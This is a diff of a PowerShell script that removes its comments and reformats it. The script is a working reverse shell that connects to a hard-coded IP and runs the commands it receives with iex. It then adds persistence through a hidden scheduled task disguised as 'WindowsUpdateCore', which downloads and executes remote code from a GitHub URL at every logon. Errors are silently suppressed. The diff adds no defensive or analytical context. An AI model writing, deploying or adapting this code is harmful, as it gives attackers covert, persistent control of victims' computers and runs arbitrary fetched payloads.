@@ -1,51 +1,41 @@
-# Reverse shell with auto-persistence via Scheduled Task (current user)
 $attackerIP = "192.168.31.227"
 $attackerPort = 51234
 
-# Stage 1: Connect back
 try {
     $client = New-Object System.Net.Sockets.TCPClient($attackerIP, $attackerPort)
     $stream = $client.GetStream()
-    [byte[]]$bytes = 0..65535 | % {0}
-    
-    # Send initial beacon
+    [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
+
     $init = "Connected as $(whoami) on $(hostname)`nPS $(Get-Location)> "
     $stream.Write(([System.Text.Encoding]::ASCII).GetBytes($init), 0, $init.Length)
 
-    # Main command loop
     while ($client.Connected) {
-        while (!$stream.DataAvailable -and $client.Connected) { Start-Sleep -Milliseconds 300 }
+        while (!$stream.DataAvailable -and $client.Connected) { 
+            Start-Sleep -Milliseconds 300 
+        }
         $i = $stream.Read($bytes, 0, $bytes.Length)
         if ($i -eq 0) { break }
+        
         $data = ([System.Text.Encoding]::ASCII).GetString($bytes, 0, $i)
         $result = (iex $data 2>&1 | Out-String)
         $result += "PS $(Get-Location)> "
         $sendBytes = ([System.Text.Encoding]::ASCII).GetBytes($result)
         $stream.Write($sendBytes, 0, $sendBytes.Length)
     }
-} catch {
-    # Silent fail (optional: log to temp if debugging)
-}
+} catch {}
 
-# Stage 2: Persistence — create scheduled task (current user, on logon)
 try {
     $taskName = "WindowsUpdateCore"
     $cmd = "-WindowStyle Hidden -ExecutionPolicy Bypass -c `"IEX (IWR 'https://raw.githubusercontent.com/X3D4L/pastebin/refs/heads/main/code')`""
     
-    # Remove existing task (avoid duplicates)
     schtasks /delete /tn "$taskName" /f 2>$null | Out-Null
-    
-    # Create new task (runs at user logon, as current user)
     schtasks /create /tn "$taskName" /tr "powershell.exe $cmd" /sc onlogon /rl highest /f | Out-Null
     
-    # Optional: send confirmation back if stream still open
     if ($client.Connected) {
         $msg = "[+] Persistence added: Task '$taskName' created.`nPS $(Get-Location)> "
         $stream.Write(([System.Text.Encoding]::ASCII).GetBytes($msg), 0, $msg.Length)
     }
-} catch {
-    # Ignore errors (e.g., if task already exists or no perms)
-}
+} catch {}
 finally {
     if ($client) { $client.Close() }
 }
